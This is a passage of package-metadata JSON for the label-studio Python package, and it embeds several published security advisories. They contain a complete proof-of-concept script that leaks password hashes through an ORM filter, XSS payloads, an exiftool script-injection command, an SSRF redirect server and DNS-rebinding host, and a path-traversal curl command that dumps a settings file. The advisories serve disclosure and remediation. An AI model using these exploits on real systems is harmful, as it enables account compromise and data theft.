API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.5":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.5/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.4)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.5","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"4c7289d449bb899a64353b34c7bc20f9536806b521a6ca8beb80ff8bf2480e06","md5":"932d46760f9f782d6dd3e76e4eeb0f2a","sha256":"da9f23af031441596f7c5738b9e02ce5198592f208d5bc1f609ba6f628cd32ef"},"downloads":-1,"filename":"label_studio-0.4.5-py3-none-any.whl","has_sig":false,"md5_digest":"932d46760f9f782d6dd3e76e4eeb0f2a","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7181812,"upload_time":"2020-01-29T17:13:01","upload_time_iso_8601":"2020-01-29T17:13:01.570297Z","url":"https://files.pythonhosted.org/packages/4c/72/89d449bb899a64353b34c7bc20f9536806b521a6ca8beb80ff8bf2480e06/label_studio-0.4.5-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"86de2b28e9bc034b02368ee992a7b6032da32eb28fc80aec7393792dd927053b","md5":"0dd5e34e751465d480dd8049d98baa46","sha256":"d0a74013eef1fb0410dd0890b3b2dd8fabf102651ccab03c45b7362e6ec17208"},"downloads":-1,"filename":"label-studio-0.4.5.tar.gz","has_sig":false,"md5_digest":"0dd5e34e751465d480dd8049d98baa46","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7115071,"upload_time":"2020-01-29T17:13:17","upload_time_iso_8601":"2020-01-29T17:13:17.246521Z","url":"https://files.pythonhosted.org/packages/86/de/2b28e9bc034b02368ee992a7b6032da32eb28fc80aec7393792dd927053b/label-studio-0.4.5.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving 